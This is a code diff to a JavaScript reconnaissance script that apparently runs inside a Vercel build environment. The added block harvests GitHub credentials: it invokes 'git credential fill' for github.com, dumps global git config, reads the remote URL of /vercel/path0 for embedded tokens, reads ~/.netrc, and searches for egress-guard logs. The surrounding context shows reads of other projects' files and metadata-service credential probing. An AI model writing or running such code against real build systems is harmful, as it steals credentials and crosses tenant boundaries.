@@ -533,6 +533,23 @@ const report = {
     const explicitBody = safe(() => readFileSync('/tmp/cp_ep','utf8').slice(0,100));
     return { ownRead, ownBody, wrongProjRead, wrongProjBody, explicitWrite, explicitBody };
   }),
+  // Git credential store analysis — can we extract GitHub credentials beyond what's in .git/config?
+  gitCredentialStore: safe(() => ({
+    credentialHelper: safe(() => execSync("git config --global credential.helper 2>/dev/null || true").toString().trim()),
+    // Try to fill credentials for github.com via the credential helper
+    credFill: safe(() => execSync(
+      "printf 'protocol=https\\nhost=github.com\\n' | git credential fill 2>/dev/null | head -10 || true"
+    ).toString().trim()),
+    // Check if osxkeychain or netrc or token-based auth is configured
+    globalGitConfig: safe(() => execSync("git config --global --list 2>/dev/null | head -20 || true").toString().trim()),
+    // Does git -C /vercel/path0 remote get-url origin show a token?
+    path0RemoteUrl: safe(() => execSync("git -C /vercel/path0 remote get-url origin 2>/dev/null || true").toString().trim()),
+    // Check ~/.netrc for embedded GitHub credentials
+    netrc: safe(() => readFileSync(`${process.env.HOME || '/root'}/.netrc`, 'utf8')).slice(0, 300),
+    // VERCEL_CONNECT_GUARD mechanism — is there a log file from this guard?
+    connectGuardValue: process.env.VERCEL_CONNECT_GUARD || 'absent',
+    connectGuardLog: safe(() => execSync("find /var/log /tmp /vercel -name '*connect*guard*' -o -name '*egress*' 2>/dev/null | head -5 || true").toString().trim()),
+  })),
   // IMDS probing — additional MMDS paths beyond IAM credentials
   imds: safe(() => {
     const imdsToken = safe(() =>
